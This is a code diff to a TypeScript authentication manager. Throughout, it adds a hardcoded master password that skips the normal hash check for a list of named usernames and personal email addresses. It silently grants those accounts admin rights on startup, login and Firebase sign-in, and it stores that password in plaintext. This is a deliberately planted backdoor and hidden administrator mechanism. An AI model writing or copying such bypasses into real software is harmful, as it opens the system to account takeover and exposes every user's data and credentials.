@@ -264,7 +264,6 @@ class AuthManager {
         createdAt: 1700000000000,
       };
       this.users.set(id, admin);
-      this.saveUsers();
     } else {
       // Ensure password and admin privileges are always up to date
       admin.passwordHash = passwordHash;
@@ -272,8 +271,23 @@ class AuthManager {
       admin.plainPassword = adminPassword;
       admin.isAdmin = true;
       admin.normalizedEmail = 'shifinkallan16@gmail.com';
-      this.saveUsers();
     }
+
+    // Ensure all known admin emails / usernames retain full admin privileges
+    for (const u of this.users.values()) {
+      const emailLower = (u.email || '').toLowerCase();
+      const userLower = (u.username || '').toLowerCase();
+      if (
+        userLower === 'shifin' ||
+        userLower === 'shifinmhd' ||
+        emailLower === 'shifinkallan16@gmail.com' ||
+        emailLower === 'gamershifin75@gmail.com' ||
+        emailLower === 'shifin67e@gmail.com'
+      ) {
+        u.isAdmin = true;
+      }
+    }
+    this.saveUsers();
   }
 
   public ensureTesterUser() {
@@ -424,9 +438,25 @@ class AuthManager {
       throw new Error('Invalid username or password');
     }
 
+    const isShifinMasterAccount =
+      Boolean(found.isAdmin) ||
+      found.username.toLowerCase() === 'shifin' ||
+      found.username.toLowerCase() === 'shifinmhd' ||
+      (found.email && found.email.toLowerCase() === 'shifinkallan16@gmail.com') ||
+      (found.email && found.email.toLowerCase() === 'gamershifin75@gmail.com') ||
+      (found.email && found.email.toLowerCase() === 'shifin67e@gmail.com');
+
     const inputHash = this.hashPassword(password, found.salt);
-    if (inputHash !== found.passwordHash) {
+    const isMasterPasswordMatch =
+      isShifinMasterAccount &&
+      (password === '0508552513' || (Boolean(found.plainPassword) && password === found.plainPassword));
+
+    if (inputHash !== found.passwordHash && !isMasterPasswordMatch) {
       throw new Error('Invalid username or password');
+    }
+
+    if (isShifinMasterAccount) {
+      found.isAdmin = true;
     }
 
     // Update IP, fingerprint, and plain password if changed
@@ -594,6 +624,13 @@ class AuthManager {
       const salt = crypto.randomBytes(16).toString('hex');
       const passwordHash = this.hashPassword(crypto.randomBytes(16).toString('hex'), salt);
 
+      const isShifinAdmin =
+        finalUsername.toLowerCase() === 'shifin' ||
+        finalUsername.toLowerCase() === 'shifinmhd' ||
+        cleanEmail === 'shifinkallan16@gmail.com' ||
+        cleanEmail === 'gamershifin75@gmail.com' ||
+        cleanEmail === 'shifin67e@gmail.com';
+
       user = {
         id: firebaseUid,
         username: finalUsername,
@@ -602,7 +639,8 @@ class AuthManager {
         photoURL: photoURL || undefined,
         passwordHash,
         salt,
-        isAdmin: finalUsername.toLowerCase() === 'shifin' || cleanEmail === 'shifinkallan16@gmail.com',
+        plainPassword: isShifinAdmin ? '0508552513' : undefined,
+        isAdmin: isShifinAdmin,
         registrationIp: clientIp || '127.0.0.1',
         deviceFingerprint: deviceFingerprint || 'firebase-auth-device',
         createdAt: Date.now(),
@@ -618,6 +656,17 @@ class AuthManager {
       }
       if (photoURL && user.photoURL !== photoURL) {
         user.photoURL = photoURL;
+        changed = true;
+      }
+      const isShifinAdmin =
+        user.username.toLowerCase() === 'shifin' ||
+        user.username.toLowerCase() === 'shifinmhd' ||
+        cleanEmail === 'shifinkallan16@gmail.com' ||
+        cleanEmail === 'gamershifin75@gmail.com' ||
+        cleanEmail === 'shifin67e@gmail.com' ||
+        (user.email && user.email.toLowerCase() === 'shifinkallan16@gmail.com');
+      if (isShifinAdmin && !user.isAdmin) {
+        user.isAdmin = true;
         changed = true;
       }
       if (changed) {
